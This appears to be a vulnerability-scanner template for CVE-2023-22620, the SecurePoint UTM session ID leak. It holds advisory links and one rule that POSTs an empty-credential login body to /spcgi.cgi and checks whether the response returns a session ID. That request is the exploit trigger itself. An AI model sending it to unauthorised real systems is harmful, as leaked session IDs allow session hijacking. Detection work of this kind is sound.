name: yaml-poc-securepoint-unified_threat_management-leak-CVE-2023-22620
binding: 1c3489f6-40ca-4fc3-aada-f4d55a18413c
detail:
    author: jiapeng.han
    links:
        - http://packetstormsecurity.com/files/171924/SecurePoint-UTM-12.x-Session-ID-Leak.html
        - http://seclists.org/fulldisclosure/2023/Apr/7
        - https://github.com/MrTuxracer/advisories/blob/master/CVEs/CVE-2023-22620.txt
        - https://rcesecurity.com
    vulnerability:
        id: 86e845cb-f20f-4087-a2f6-181a3524419a
        level: high
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /spcgi.cgi
            headers:
                Content-Type: application/json; charset=UTF-8
            body: '{"module":"auth","command":["login"],"sessionid":"","arguments":{"user":"","pass":""}}'
            follow_redirects: false
        expression: 'response.status == 200 && response.body.bcontains(b"\"sessionid\": \"") && response.body.bcontains(b"\"result\": {")'
expression: r0()
